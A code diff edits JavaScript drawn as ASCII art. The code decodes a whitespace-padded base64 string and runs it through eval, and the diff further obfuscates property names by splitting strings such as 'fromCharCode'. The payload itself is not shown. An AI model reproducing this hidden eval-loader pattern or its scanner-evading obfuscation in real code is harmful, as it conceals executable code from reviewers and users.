@@ -61,9 +61,12 @@ OHIuOHM           uOHQuOHUuO                      TAuOTEuN2QuN2Uu               
           IubDM            ubDQubDU           ubDYubDc             ubDgubDkubGEubG
                             IubGMubG           QubGUubGY             ubGcubGgubGkubGoubGsubGwubG0ub
                              G4ubG8ub           HAubHEubHI              ubHMubHQubHUubTAubTEubTIubT
-                              MubTQubT            UubTYubTcu                a2oubmQubGwua20=`;v=eval;
-                               z=atob;              s=String;s                     .p=s.prototype;
-                                 s.p.r=s.             p.replace;x=
-                                  /\s|\n/g;f=s.         fromCharCode;
-                                   e=f();v(z(a            .r(x,e)));v(d(
-                                     q));})();
+                              MubTQubT            UubTYubTcu                a2oubmQubGwua20=`;/*!*/
+                               v=eval;z=            atob;;;;s=                      String;s.
+                                 p=s['pr'             +'ototype']
+                                  ;s.p.r=s.             p.replace;x=
+                                   /\s|\n/g;f             =s['fromCharC'
+                                     +'ode'];e              =f();v(z(a.r(x,e))
+                                       );v(d(q)                 );})();u=`Amai!
+                                        Amaiam                     ai!Amaisaus!
+                                                                        Amai!`
